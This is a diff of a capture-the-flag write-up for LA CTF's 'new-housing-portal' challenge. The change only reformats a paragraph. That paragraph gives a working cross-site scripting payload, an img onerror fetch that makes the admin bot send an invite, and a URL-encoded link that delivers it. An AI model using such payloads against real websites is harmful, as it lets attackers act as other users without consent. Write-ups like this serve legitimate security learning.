@@ -38,7 +38,9 @@ Admin Bot - https://admin-bot.lac.tf/new-housing-portal**
 **We could exploit the lack of validation and sanitization in the /register route by registering with an input that contains JavaScript code to send an invite to ahmed2 (my username). Then, we could use the /finder route to search for the JavaScript code and send the link to Samy. When Samy clicks on the link, the JavaScript code would execute in his browser, inviting you and potentially allowing you to retrieve the flag.**
 
 **And this was right i used this script 
-```<img src="x" onerror='fetch("https://new-housing-portal.chall.lac.tf/finder", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body:"username=ahmed2"});'>``` as name and send the link like this https://new-housing-portal.chall.lac.tf/finder/?q=%3Cimg%20src%3D%22x%22%20onerror%3D%27fetch(%22https%3A%2F%2Fnew-housing-portal.chall.lac.tf%2Ffinder%22%2C%20%7Bmethod%3A%20%22POST%22%2C%20mode%3A%20%22no-cors%22%2C%20headers%3A%20%7B%22Content-Type%22%3A%20%22application%2Fx-www-form-urlencoded%22%7D%2C%20body%3A%22username%3Dahmed2%22%7D)%3B%27%3E to samy and i got the invite :D and the flag**
+```<img src="x" onerror='fetch("https://new-housing-portal.chall.lac.tf/finder", {method: "POST", mode: "no-cors", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body:"username=ahmed2"});'>```
+as name and send the link like this 
+https://new-housing-portal.chall.lac.tf/finder/?q=%3Cimg%20src%3D%22x%22%20onerror%3D%27fetch(%22https%3A%2F%2Fnew-housing-portal.chall.lac.tf%2Ffinder%22%2C%20%7Bmethod%3A%20%22POST%22%2C%20mode%3A%20%22no-cors%22%2C%20headers%3A%20%7B%22Content-Type%22%3A%20%22application%2Fx-www-form-urlencoded%22%7D%2C%20body%3A%22username%3Dahmed2%22%7D)%3B%27%3E to samy and i got the invite :D and the flag**
 
 ![image](https://github.com/qlashx/ctf_writeups/assets/106611511/df1008d4-4a3c-4c7c-8933-378adc157305)
 
